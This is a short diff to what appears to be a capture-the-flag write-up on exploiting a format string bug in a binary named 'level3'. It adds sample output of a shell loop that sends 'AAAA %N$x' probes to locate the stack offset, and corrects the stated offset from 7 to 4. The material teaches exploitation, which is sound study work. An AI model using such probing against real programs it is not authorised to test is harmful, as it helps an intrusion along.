@@ -48,8 +48,14 @@ $1 = (int *) 0x0804988c
 for i in $(seq 1 40); do
   python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
 done
+AAAA 200
+AAAA b7fd1ac0
+AAAA b7ff37d0
+AAAA 41414141
+AAAA 24352520
+...
 ```
-Look for 41414141 in the output. appears at %4$x, that means the offset is 7.
+Look for 41414141 in the output. appears at %4$x, that means the offset is 4.
 
 The string ' %%%d\$x' % $i
 
